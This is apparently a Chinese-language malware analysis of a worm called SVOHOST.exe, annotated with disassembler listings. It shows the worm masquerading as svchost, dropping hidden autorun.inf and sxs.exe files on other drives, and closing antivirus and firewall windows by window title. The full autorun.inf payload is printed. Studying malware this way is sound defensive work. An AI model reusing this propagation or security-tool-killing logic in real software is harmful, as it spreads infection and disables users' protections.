
```
00408F95  |.  8B55 D8       MOV EDX,DWORD PTR SS:[EBP-28]
00408F98  |.  58            POP EAX
00408F99  |.  E8 C6ADFFFF   CALL SVOHOST.00403D64
00408F9E  |.  74 44         JE SHORT SVOHOST.00408FE4
00408FA0  |.  E8 13BDFFFF   CALL SVOHOST.00404CB8
00408FA5  |.  E8 BAD8FFFF   CALL SVOHOST.00406864
00408FAA  |.  6A 01         PUSH 1
00408FAC  |.  6A 00         PUSH 0
00408FAE  |.  6A 00         PUSH 0
00408FB0  |.  8D45 D0       LEA EAX,DWORD PTR SS:[EBP-30]
00408FB3  |.  E8 E0C0FFFF   CALL SVOHOST.00405098
00408FB8  |.  8D45 D0       LEA EAX,DWORD PTR SS:[EBP-30]
00408FBB  |.  BA E4904000   MOV EDX,SVOHOST.004090E4                 ;  ASCII "SVOHOST.exe"
00408FC0  |.  E8 63ACFFFF   CALL SVOHOST.00403C28
00408FC5  |.  8B45 D0       MOV EAX,DWORD PTR SS:[EBP-30]
00408FC8  |.  E8 4BAEFFFF   CALL SVOHOST.00403E18
00408FCD  |.  50            PUSH EAX                                 ; |FileName = "C:\windows\system32\SVOHOST.exe"
00408FCE  |.  68 04914000   PUSH SVOHOST.00409104                    ; |Operation = "open"
00408FD3  |.  6A 00         PUSH 0                                   ; |hWnd = NULL
00408FD5  |.  E8 A6B6FFFF   CALL SVOHOST.00404680
```

`ShellExecuteA`运行`C:\windows\system32\SVOHOST.exe`这个文件，和系统文件`SVCHOST.EXE`就差一个字.但是运行里面是可以看的到的。

```
00408FDA  |.  E8 E9E0FFFF   CALL SVOHOST.004070C8
00408FDF  |.  E9 B3000000   JMP SVOHOST.00409097
00409097  |>  33C0          XOR EAX,EAX  //清除EAX的路径了
00405F9E  |.  50            |PUSH EAX                                ; /RootPathName      //磁盘容量
00405F9F  |.  E8 4CE4FFFF   |CALL <JMP.&kernel32.GetDriveTypeA>      ; \GetDriveTypeA    //获取驱动盘
00405FA4  |.  83F8 02       |CMP EAX,2                //判断分区数
00405FA7  |.  0F85 50020000 |JNZ SVOHOST.004061FD
00405FAD  |.  8D45 F0       |LEA EAX,DWORD PTR SS:[EBP-10]
00405FB0  |.  B9 44624000   |MOV ECX,SVOHOST.00406244   // 生成 autorun.inf 文件
00405FB5  |.  8B55 FC       |MOV EDX,DWORD PTR SS:[EBP-4]
00405FB8  |.  E8 AFDCFFFF   |CALL SVOHOST.00403C6C
00405FBD  |.  8B45 F0       |MOV EAX,DWORD PTR SS:[EBP-10]
00405FC0  |.  E8 E3ECFFFF   |CALL SVOHOST.00404CA8
00405FC5  |.  3C 01         |CMP AL,1
00405FC7  |.  75 61         |JNZ SHORT SVOHOST.0040602A
00405FC9  |.  8D45 EC       |LEA EAX,DWORD PTR SS:[EBP-14]
00405FCC  |.  B9 5C624000   |MOV ECX,SVOHOST.0040625C     // 生成 sxs.exe文件
00405FD1  |.  8B55 FC       |MOV EDX,DWORD PTR SS:[EBP-4]
00405FD4  |.  E8 93DCFFFF   |CALL SVOHOST.00403C6C
00405FD9  |.  8B45 EC       |MOV EAX,DWORD PTR SS:[EBP-14]
00405FDC  |.  E8 C7ECFFFF   |CALL SVOHOST.00404CA8
00405FE1  |.  3C 01         |CMP AL,1
00405FE3  |.  75 45         |JNZ SHORT SVOHOST.0040602A
```

在其他分区生成名为`autorun.inf`和`sxs.exe`二个同级文件.文件属性为+`A` +`H` +`S`

```
0040616F  |.  8BC6          |MOV EAX,ESI
00406171  |.  BA 84624000   |MOV EDX,SVOHOST.00406284
;  open=sxs.exe
00406176  |.  E8 29DEFFFF   |CALL SVOHOST.00403FA4
0040617B  |.  E8 40D0FFFF   |CALL SVOHOST.004031C0
00406180  |.  E8 DBC3FFFF   |CALL SVOHOST.00402560
00406185  |.  8BC6          |MOV EAX,ESI
00406187  |.  BA 9C624000   |MOV EDX,SVOHOST.0040629C
;  shellexecute=sxs.exe
0040618C  |.  E8 13DEFFFF   |CALL SVOHOST.00403FA4
00406191  |.  E8 2AD0FFFF   |CALL SVOHOST.004031C0
00406196  |.  E8 C5C3FFFF   |CALL SVOHOST.00402560
0040619B  |.  8BC6          |MOV EAX,ESI
0040619D  |.  BA BC624000   |MOV EDX,SVOHOST.004062BC                ;  shell\auto\command=sxs.exe
004061A2  |.  E8 FDDDFFFF   |CALL SVOHOST.00403FA4
004061A7  |.  E8 14D0FFFF   |CALL SVOHOST.004031C0
004061AC  |.  E8 AFC3FFFF   |CALL SVOHOST.00402560
004061B1  |.  8BC6          |MOV EAX,ESI
004061B3  |.  E8 F0C9FFFF   |CALL SVOHOST.00402BA8
004061B8  |.  E8 A3C3FFFF   |CALL SVOHOST.00402560
004061BD  |.  6A 06         |PUSH 6
004061BF  |.  8D45 C4       |LEA EAX,DWORD PTR SS:[EBP-3C]
004061C2  |.  B9 5C624000   |MOV ECX,SVOHOST.0040625C                ;  \sxs.exe
004061C7  |.  8B55 FC       |MOV EDX,DWORD PTR SS:[EBP-4]
```

来看看`autorun.inf`的内容，为达到自运行的目的不折手段。

```
[AutoRun]
open=sxs.exe
shellexecute=sxs.exe
shell\Auto\command=sxs.exe
```

系统重做打开其他盘又感染了.郁闷，怎么现在病毒木马都这样！碰到几个了.

```
00406DBF  |.  B8 38704000   |MOV EAX,SVOHOST.00407038                ;  qqkav
00406DC4  |.  E8 2FD1FFFF   |CALL SVOHOST.00403EF8
00406DC9  |.  85C0          |TEST EAX,EAX
00406DCB  |.  74 0C         |JE SHORT SVOHOST.00406DD9
00406DCD  |.  6A 00         |PUSH 0                        ; /lParam = 0
00406DCF  |.  6A 00         |PUSH 0                         ; |wParam = 0
00406DD1  |.  6A 12         |PUSH 12                   ; |Message = WM\_QUIT
00406DD3  |.  53            |PUSH EBX                     ; |hWnd
00406DD4  |.  E8 17D7FFFF   |CALL <JMP.&user32.PostMessageA>         ; \PostMessageA
00406DD9  |>  85DB          |TEST EBX,EBX
00406DDB  |.^ 75 BA         \JNZ SHORT SVOHOST.00406D97
00406DDD  |.  E8 DED6FFFF   CALL <JMP.&user32.GetDesktopWindow>      ; [GetDesktopWindow
00406DE2  |.  8BF0          MOV ESI,EAX
00406DE4  |>  6A 00         /PUSH 0                                  ; /Title = NULL
00406DE6  |.  6A 00         |PUSH 0                                  ; |Class = 0
00406DE8  |.  53            |PUSH EBX                                ; |hAfterWnd
00406DE9  |.  56            |PUSH ESI                                ; |hParent
00406DEA  |.  E8 C1D6FFFF   |CALL <JMP.&user32.FindWindowExA>        ; \FindWindowExA
00406DEF  |.  8BD8          |MOV EBX,EAX
00406DF1  |.  6A 65         |PUSH 65                                 ; /Count = 65 (101.)
00406DF3  |.  57            |PUSH EDI                                ; |Buffer
00406DF4  |.  53            |PUSH EBX                                ; |hWnd
00406DF5  |.  E8 D6D6FFFF   |CALL <JMP.&user32.GetWindowTextA>       ; \GetWindowTextA
00406DFA  |.  8D45 90       |LEA EAX,DWORD PTR SS:[EBP-70]
00406DFD  |.  8BD7          |MOV EDX,EDI
00406DFF  |.  B9 65000000   |MOV ECX,65
00406E04  |.  E8 FFCDFFFF   |CALL SVOHOST.00403C08
00406E09  |.  8B55 90       |MOV EDX,DWORD PTR SS:[EBP-70]
00406E0C  |.  B8 48704000   |MOV EAX,SVOHOST.00407048       ;  防火墙
00406E11  |.  E8 E2D0FFFF   |CALL SVOHOST.00403EF8
00406E16  |.  85C0          |TEST EAX,EAX
00406E18  |.  74 0C         |JE SHORT SVOHOST.00406E26
00406E1A  |.  6A 00         |PUSH 0                          ; /lParam = 0
00406E1C  |.  6A 00         |PUSH 0                            ; |wParam = 0
00406E1E  |.  6A 12         |PUSH 12                    ; |Message = WM\_QUIT
00406E20  |.  53            |PUSH EBX                     ; |hWnd
00406E21  |.  E8 CAD6FFFF   |CALL <JMP.&user32.PostMessageA>         ; \PostMessageA
00406E26  |>  85DB          |TEST EBX,EBX
00406E28  |.^ 75 BA         \JNZ SHORT SVOHOST.00406DE4
00406E2A  |.  E8 91D6FFFF   CALL <JMP.&user32.GetDesktopWindow>      ; [GetDesktopWindow
00406E2F  |.  8BF0          MOV ESI,EAX
00406E31  |>  6A 00         /PUSH 0                           ; /Title = NULL
00406E33  |.  6A 00         |PUSH 0                           ; |Class = 0
00406E35  |.  53            |PUSH EBX                                ; |hAfterWnd
00406E36  |.  56            |PUSH ESI                          ; |hParent
00406E37  |.  E8 74D6FFFF   |CALL <JMP.&user32.FindWindowExA>
00406E3C  |.  8BD8          |MOV EBX,EAX
00406E3E  |.  6A 65         |PUSH 65                           ; /Count = 65 (101.)
00406E40  |.  57            |PUSH EDI                          ; |Buffer
00406E41  |.  53            |PUSH EBX                          ; |hWnd
00406E42  |.  E8 89D6FFFF   |CALL <JMP.&user32.GetWindowTextA>
00406E47  |.  8D45 8C       |LEA EAX,DWORD PTR SS:[EBP-74]
00406E4A  |.  8BD7          |MOV EDX,EDI
00406E4C  |.  B9 65000000   |MOV ECX,65
00406E51  |.  E8 B2CDFFFF   |CALL SVOHOST.00403C08
00406E56  |.  8B55 8C       |MOV EDX,DWORD PTR SS:[EBP-74]
00406E59  |.  B8 58704000   |MOV EAX,SVOHOST.00407058        ;  网镖
00406E5E  |.  E8 95D0FFFF   |CALL SVOHOST.00403EF8
00406E63  |.  85C0          |TEST EAX,EAX
00406E65  |.  74 0C         |JE SHORT SVOHOST.00406E73
```
